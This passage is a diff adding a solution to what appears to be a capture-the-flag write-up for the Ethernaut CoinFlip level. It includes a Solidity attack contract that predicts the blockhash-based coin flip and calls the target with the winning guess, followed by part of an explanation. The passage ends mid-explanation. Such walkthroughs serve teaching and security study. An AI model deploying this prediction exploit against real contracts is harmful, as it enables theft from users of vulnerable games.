@@ -62,3 +62,46 @@ The bool side checks if the coinFlip is equal to 1. If it is equal to 1, side be
 
 Next we see if the side is equal to the __guess_ that is passed. In the case that it is equal, the consecutiveWins variable goes up by 1 and the function is returned as true. Else, the consecutiveWins is reset and becomes 0 and returns the function value as false.
 
+
+# Solution
+In order to override this contract, let's build another contract to hack this. 
+I built the following contract on [Remix IDE](https://remix.ethereum.org/)
+
+### CoinFlipHack.sol
+
+
+```solidity
+pragma solidity ^0.8.0;
+
+import "./CoinFlip.sol";
+
+contract CoinFlipHack {
+    CoinFlip public hackedContract;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    // _hackedContractAddr = 0xA91C791D56895210967d1ec7a69Fe4b8fc7a910e;
+
+    constructor(address _hackedContractAddr) public {
+        hackedContract = CoinFlip(_hackedContractAddr);
+    }
+
+    function flip() public returns (bool){
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = uint256(blockValue/FACTOR);
+        bool side = coinFlip == 1 ? true : false;
+        hackedContract.flip(side);
+    }
+
+}
+```
+
+So, how is this code overriding the main contract code?
+
+We first import the previous contract by simply making another file copy pasting the code on there and naming it CoinFlip. 
+
+After adding the import statement, let's build our CoinFlipHack smart contract code.
+hackedContract is the public variable to represent the original contract.
+We are using the same FACTOR from before.
+
+We declare the constructor with the argument __hackedContractAddr__ which is of address type this address is the CoinFlip contract address that we will be deploying at. 
+
+
